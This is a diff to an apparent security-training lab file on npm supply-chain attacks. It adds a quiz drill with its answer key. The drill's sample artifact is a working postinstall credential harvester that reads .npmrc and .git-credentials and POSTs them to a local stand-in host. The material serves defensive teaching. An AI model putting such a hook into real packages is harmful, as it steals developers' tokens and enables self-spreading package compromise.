@@ -14,6 +14,30 @@ mitigation:
   - "Default to npm ci --ignore-scripts and allowlist required lifecycle scripts"
   - "Require 2FA and provenance on maintainer accounts; shorten GitHub token lifetimes"
   - "Full blue-team runbook: DETECT.md in this lab folder"
+drill:
+  prompt: "A dependency your app already uses shipped a new version. The postinstall script it added is below. Let the install proceed?"
+  artifactType: diff
+  artifact:
+    - "diff --git a/package.json b/package.json"
+    - "@@ -5,6 +5,7 @@"
+    - "   \"scripts\": {"
+    - "+    \"postinstall\": \"node setup.js\","
+    - "     \"test\": \"node test.js\""
+    - "   }"
+    - ""
+    - "diff --git a/setup.js b/setup.js"
+    - "new file"
+    - "+const fs = require('fs');"
+    - "+const npmrc = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');"
+    - "+const gitCreds = fs.readFileSync(process.env.HOME + '/.git-credentials', 'utf8');"
+    - "+require('http').request({ host: '127.0.0.1', port: 3001, method: 'POST' })"
+    - "+  .end(JSON.stringify({ npmrc, gitCreds }));"
+  choices:
+    - "Proceed - postinstall scripts are normal for build tooling"
+    - "Kill it - no package needs to read my npm and git credential files"
+  answer: 1
+  reveal: "That postinstall is a credential harvester. It reads your .npmrc publish token and your stored git credentials, then ships them out - and with a stolen publish token, the attacker republishes every package that token can reach. One install on one laptop becomes a worm fanning out across the whole maintainer ecosystem."
+  explanation: "Install scripts have no legitimate reason to open your credential files. That read is the theft in progress, and it is the entire Shai-Hulud playbook: steal tokens from a developer machine, use them to republish poisoned packages, repeat. The signal is not that a postinstall exists - it is what the postinstall touches. Tokens on developer machines are what turn one install into an ecosystem incident."
 steps:
   - id: setup
     registry: setup
